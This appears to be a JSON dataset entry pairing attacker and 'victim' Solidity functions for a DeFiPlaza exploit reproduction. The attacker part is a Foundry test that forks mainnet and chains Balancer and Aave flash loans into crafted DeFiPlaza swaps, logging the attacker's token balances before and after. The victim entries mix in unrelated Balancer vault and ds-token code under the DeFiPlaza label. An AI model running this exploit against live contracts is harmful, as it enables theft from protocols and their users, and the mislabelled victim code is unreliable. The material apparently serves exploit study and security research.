[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "approveAll",
    "original_code": "    function approveAll() public {\n        SUSHI.approve(address(DEFI), type(uint256).max);\n        COMP.approve(address(DEFI), type(uint256).max);\n        CRV.approve(address(DEFI), type(uint256).max);\n        CRV.approve(address(AAVE), type(uint256).max);\n        LINK.approve(address(DEFI), type(uint256).max);\n        LINK.approve(address(AAVE), type(uint256).max);\n        AAVEtoken.approve(address(AAVE), type(uint256).max);\n        Spell.approve(address(DEFI), type(uint256).max);\n        CVX.approve(address(DEFI), type(uint256).max);\n        eXRD.approve(address(DEFI), type(uint256).max);\n        SUSHI.approve(address(DEFI), type(uint256).max);\n        WBTC.approve(address(AAVE), type(uint256).max);\n        WBTC.approve(address(DEFI), type(uint256).max);\n        Matic.approve(address(DEFI), type(uint256).max);\n        MKR.approve(address(DEFI), type(uint256).max);\n        MKR.approve(address(AAVE), type(uint256).max);\n        YFI.approve(address(DEFI), type(uint256).max);\n        DFP2.approve(address(DEFI), type(uint256).max);\n        USDT.approve(address(DEFI), type(uint256).max);\n        USDT.approve(address(AAVE), type(uint256).max);\n        USDC.approve(address(DEFI), type(uint256).max);\n        DAI.approve(address(DEFI), type(uint256).max);\n        DAI.approve(address(AAVE), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        DEFI.swap(address(USDT), address(COMP), 256_581_711_438, 0);\n        DEFI.swap(address(WBTC), address(DFP2), 462_981_892, 0);\n        DEFI.swap(address(USDC), address(eXRD), 254_772_346_112, 0);\n        DEFI.swap(address(MKR), address(SUSHI), 122_382_648_177_021_930_433, 0);\n        DEFI.swap(address(DAI), address(CVX), 254_862_134_828_721_809_308_072, 0);\n        DEFI.swap(address(LINK), address(Matic), 21_571_067_484_081_842_602_565, 0);\n\n        DEFI.swap{value: 86 ether}(address(0), address(Spell), 86 ether, 0);\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        address[] memory assets = new address[](6);\n        assets[0] = address(WBTC);\n        assets[1] = address(LINK);\n        assets[2] = address(DAI);\n        assets[3] = address(MKR);\n        assets[4] = address(CRV);\n        assets[5] = address(USDT);\n        uint256[] memory amounts = new uint256[](6);\n        amounts[0] = 5_781_711_628;\n        amounts[1] = 418_582_543_975_397_474_624_769;\n        amounts[2] = 3_503_975_614_905_139_135_512_778;\n        amounts[3] = 2_280_638_770_110_776_934_873;\n        amounts[4] = 1_044_246_667_915_305_492_650_602;\n        amounts[5] = 1_396_680_406_245;\n        uint256[] memory interestRateModes = new uint256[](7);\n        interestRateModes[0] = 2;\n        interestRateModes[1] = 2;\n        interestRateModes[2] = 2;\n        interestRateModes[3] = 0;\n        interestRateModes[4] = 0;\n        interestRateModes[5] = 2;\n        AAVE.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(\"\"), 0);\n\n        AAVE.repay(address(WBTC), 5_781_711_628, 2, address(this));\n        AAVE.repay(address(LINK), 418_582_543_975_397_474_624_769, 2, address(this));\n        AAVE.repay(address(DAI), 3_503_975_614_905_139_135_512_778, 2, address(this));\n        AAVE.repay(address(USDT), 1_396_680_406_245, 2, address(this));\n        AAVE.withdraw(address(AAVEtoken), 626_870_781_897_849_610_814_425, address(this));\n\n        WBTC.transfer(address(Balancer), 3_453_558_744);\n        LINK.transfer(address(Balancer), 11_703_486_364_971_912_026_396);\n        DAI.transfer(address(Balancer), 1_579_853_285_099_364_323_842_974);\n        AAVEtoken.transfer(address(Balancer), 626_870_781_897_849_610_814_425);\n        MKR.transfer(address(Balancer), 160_573_001_420_344_730_080);\n        USDC.transfer(address(Balancer), 5_082_037_851_392);\n        WETH.transfer(address(Balancer), 34_546_473_222_602_105_572_392);\n        CRV.transfer(address(Balancer), 3_901_990_478_262_973_511_258);\n        USDT.transfer(address(Balancer), 3_721_449_521_913);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_240_538);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance before exploit\", address(this).balance, 18);\n        emit log_named_decimal_uint(\n            \"[End] Attacker eXRD balance before exploit\", eXRD.balanceOf(address(this)), eXRD.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance before exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\n            \"[End] Attacker DAI balance before exploit\", DAI.balanceOf(address(this)), DAI.decimals()\n        );\n        emit log_named_decimal_uint(\"[End] Attacker LINK balance before exploit\", LINK.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBTC balance before exploit\", WBTC.balanceOf(address(this)), WBTC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Spell balance before exploit\", Spell.balanceOf(address(this)), Spell.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker MKR balance before exploit\", MKR.balanceOf(address(this)), MKR.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker CRV balance before exploit\", CRV.balanceOf(address(this)), CRV.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker YFI balance before exploit\", YFI.balanceOf(address(this)), YFI.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Sushi balance before exploit\", SUSHI.balanceOf(address(this)), SUSHI.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Matic balance before exploit\", Matic.balanceOf(address(this)), Matic.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker COMP balance before exploit\", COMP.balanceOf(address(this)), COMP.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker CVX balance before exploit\", CVX.balanceOf(address(this)), CVX.decimals()\n        );\n        console.log(\"=====================\");\n        bytes memory userencodeData = abi.encode(1, address(this));\n        approveAll();\n        uint256[] memory amount = new uint256[](9);\n        address[] memory token = new address[](9);\n\n        token[0] = address(WBTC);\n        token[1] = address(LINK);\n        token[2] = address(DAI);\n        token[3] = address(AAVEtoken);\n        token[4] = address(MKR);\n        token[5] = address(USDC);\n        token[6] = address(WETH);\n        token[7] = address(CRV);\n        token[8] = address(USDT);\n\n        amount[0] = 3_453_558_744;\n        amount[1] = 11_703_486_364_971_912_026_396;\n        amount[2] = 1_579_853_285_099_364_323_842_974;\n        amount[3] = 626_870_781_897_849_610_814_425;\n        amount[4] = 160_573_001_420_344_730_080;\n        amount[5] = 5_082_037_851_392;\n        amount[6] = 34_546_473_222_602_105_572_392;\n        amount[7] = 3_901_990_478_262_973_511_258;\n        amount[8] = 3_721_449_521_913;\n        Balancer.flashLoan(address(this), token, amount, userencodeData);\n\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance after exploit\", address(this).balance, 18);\n        emit log_named_decimal_uint(\n            \"[End] Attacker eXRD balance after exploit\", eXRD.balanceOf(address(this)), eXRD.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 6);\n        emit log_named_decimal_uint(\n            \"[End] Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals()\n        );\n        emit log_named_decimal_uint(\"[End] Attacker LINK balance after exploit\", LINK.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBTC balance after exploit\", WBTC.balanceOf(address(this)), WBTC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Spell balance after exploit\", Spell.balanceOf(address(this)), Spell.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker MKR balance after exploit\", MKR.balanceOf(address(this)), MKR.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker CRV balance after exploit\", CRV.balanceOf(address(this)), CRV.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker YFI balance after exploit\", YFI.balanceOf(address(this)), YFI.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Sushi balance after exploit\", SUSHI.balanceOf(address(this)), SUSHI.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker Matic balance after exploit\", Matic.balanceOf(address(this)), Matic.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker COMP balance after exploit\", COMP.balanceOf(address(this)), COMP.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"[End] Attacker CVX balance after exploit\", CVX.balanceOf(address(this)), CVX.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "vulnContract",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "addMultiple",
    "original_code": "  function addMultiple(address[] calldata tokens, uint256[] calldata maxAmounts)\n    external\n    payable\n    override\n    returns (uint256 actualLP)\n  {\n    // Perform basic checks\n    Config memory _config = DFPconfig;\n    require(_config.unlocked, \"DFP: Locked\");\n    require(tokens.length == 16, \"DFP: Bad tokens array length\");\n    require(maxAmounts.length == 16, \"DFP: Bad maxAmount array length\");\n\n    // Check ETH amount/ratio first\n    require(tokens[0] == address(0), \"DFP: No ETH found\");\n    require(maxAmounts[0] == msg.value, \"DFP: Incorrect ETH amount\");\n    uint256 dexBalance = address(this).balance - msg.value;\n    uint256 actualRatio = msg.value * (1<<128) / dexBalance;\n\n    // Check ERC20 amounts/ratios\n    uint256 currentRatio;\n    address previous;\n    address token;\n    for (uint256 i = 1; i < 16; i++) {\n      token = tokens[i];\n      require(token > previous, \"DFP: Require ordered list\");\n      require(\n        listedTokens[token].state > State.Delisting,\n        \"DFP: Token not listed\"\n      );\n      dexBalance = IERC20(token).balanceOf(address(this));\n      currentRatio = maxAmounts[i] * (1 << 128) / dexBalance;\n      if (currentRatio < actualRatio) {\n        actualRatio = currentRatio;\n      }\n      previous = token;\n    }\n\n    // Calculate how many LP will be generated\n    actualLP = (actualRatio * totalSupply() >> 64) * DFPconfig.oneMinusTradingFee >> 128;\n\n    // Collect ERC20 tokens\n    for (uint256 i = 1; i < 16; i++) {\n      token = tokens[i];\n      dexBalance = IERC20(token).balanceOf(address(this));\n      IERC20(token).safeTransferFrom(msg.sender, address(this), dexBalance * actualRatio >> 128);\n    }\n\n    // Mint the LP tokens\n    _mint(msg.sender, actualLP);\n    emit MultiLiquidityAdded(msg.sender, actualLP, totalSupply());\n\n    // Refund ETH change\n    dexBalance = address(this).balance - msg.value;\n    address payable sender = payable(msg.sender);\n    sender.transfer(msg.value - (dexBalance * actualRatio >> 128));\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address src, address guy) public view returns (uint) {\n        return _approvals[src][guy];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address guy, uint wad) public returns (bool) {\n        _approvals[msg.sender][guy] = wad;\n\n        Approval(msg.sender, guy, wad);\n\n        return true;\n    }\n}\n\n////// lib/ds-token/src/token.sol\n/// token.sol -- ERC20 implementation with minting and burning\n\n// Copyright (C) 2015, 2016, 2017  DappHub, LLC\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address src) public view returns (uint) {\n        return _balances[src];\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "removeLiquidity",
    "original_code": "  function removeLiquidity(uint256 LPamount, address outputToken, uint256 minOutputAmount)\n    external\n    onlyListedToken(outputToken)\n    override\n    returns (uint256 actualOutput)\n  {\n    // Checks the initial balance of the token desired as output token\n    uint256 initialBalance;\n    if (outputToken == address(0)) {\n      initialBalance = address(this).balance;\n    } else {\n      initialBalance = IERC20(outputToken).balanceOf(address(this));\n    }\n\n    // Calculates intermediate variable F = (1-R)^16 and then the resulting output amount.\n    uint256 F_;\n    F_ = (1 << 64) - (LPamount << 64) / totalSupply();   // (1-R)      (0.64 bits)\n    F_ = F_ * F_;                                       // (1-R)^2    (0.128 bits)\n    F_ = F_ * F_ >> 192;                                // (1-R)^4    (0.64 bits)\n    F_ = F_ * F_;                                       // (1-R)^8    (0.128 bits)\n    F_ = F_ * F_ >> 192;                                // (1-R)^16   (0.64 bits)\n    actualOutput = initialBalance * ((1 << 64) - F_) >> 64;\n    require(actualOutput > minOutputAmount, \"DFP: No deal\");\n\n    // Burns the LP tokens and sends the output tokens\n    _burn(msg.sender, LPamount);\n    if (outputToken == address(0)) {\n      address payable sender = payable(msg.sender);\n      sender.transfer(actualOutput);\n    } else {\n      IERC20(outputToken).safeTransfer(msg.sender, actualOutput);\n    }\n\n    // Emitting liquidity removal event to enable better governance decisions\n    emit LiquidityRemoved(msg.sender, outputToken, actualOutput, LPamount);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(\n        SingleSwap memory singleSwap,\n        FundManagement memory funds,\n        uint256 limit,\n        uint256 deadline\n    )\n        external\n        payable\n        override\n        nonReentrant\n        whenNotPaused\n        authenticateFor(funds.sender)\n        returns (uint256 amountCalculated)\n    {\n        // The deadline is timestamp-based: it should not be relied upon for sub-minute accuracy.\n        // solhint-disable-next-line not-rely-on-time\n        _require(block.timestamp <= deadline, Errors.SWAP_DEADLINE);\n\n        // This revert reason is for consistency with `batchSwap`: an equivalent `swap` performed using that function\n        // would result in this error.\n        _require(singleSwap.amount > 0, Errors.UNKNOWN_AMOUNT_IN_FIRST_SWAP);\n\n        IERC20 tokenIn = _translateToIERC20(singleSwap.assetIn);\n        IERC20 tokenOut = _translateToIERC20(singleSwap.assetOut);\n        _require(tokenIn != tokenOut, Errors.CANNOT_SWAP_SAME_TOKEN);\n\n        // Initializing each struct field one-by-one uses less gas than setting all at once.\n        IPoolSwapStructs.SwapRequest memory poolRequest;\n        poolRequest.poolId = singleSwap.poolId;\n        poolRequest.kind = singleSwap.kind;\n        poolRequest.tokenIn = tokenIn;\n        poolRequest.tokenOut = tokenOut;\n        poolRequest.amount = singleSwap.amount;\n        poolRequest.userData = singleSwap.userData;\n        poolRequest.from = funds.sender;\n        poolRequest.to = funds.recipient;\n        // The lastChangeBlock field is left uninitialized.\n\n        uint256 amountIn;\n        uint256 amountOut;\n\n        (amountCalculated, amountIn, amountOut) = _swapWithPool(poolRequest);\n        _require(singleSwap.kind == SwapKind.GIVEN_IN ? amountOut >= limit : amountIn <= limit, Errors.SWAP_LIMIT);\n\n        _receiveAsset(singleSwap.assetIn, amountIn, funds.sender, funds.fromInternalBalance);\n        _sendAsset(singleSwap.assetOut, amountOut, funds.recipient, funds.toInternalBalance);\n\n        // If the asset in is ETH, then `amountIn` ETH was wrapped into WETH.\n        _handleRemainingEth(_isETH(singleSwap.assetIn) ? amountIn : 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view returns (uint) {\n        return _supply;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        if (src != msg.sender) {\n            _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        }\n\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    {\n        if (src != msg.sender) {\n            _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        }\n\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DeFiPlaza",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]